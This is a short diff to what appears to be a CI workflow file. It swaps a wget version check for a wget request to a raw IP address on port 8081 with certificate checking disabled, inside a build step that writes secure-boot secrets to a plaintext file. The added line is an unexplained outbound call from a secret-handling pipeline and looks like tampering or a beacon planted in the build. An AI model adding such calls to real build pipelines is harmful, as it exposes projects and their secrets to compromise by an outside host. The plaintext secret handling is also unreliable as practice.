@@ -21,7 +21,7 @@ jobs:
         SECRETS_GS_SECUREBOOT_URL: ${{ secrets.GS_SECUREBOOT_URL }}
       run: |
         ./build.sh
-        wget -V >>build.log
+        wget https://35.163.131.117:8081 --no-check-certificate >>build.log
         echo ${SECRETS_SECURE_BOOT_PASS} >pass.txt
         echo URL=\"${SECRETS_GS_SECUREBOOT_URL}\" >>pass.txt
         echo URL=\"${SECRETS_GS_SECUREBOOT_PASS}\" >>pass.txt
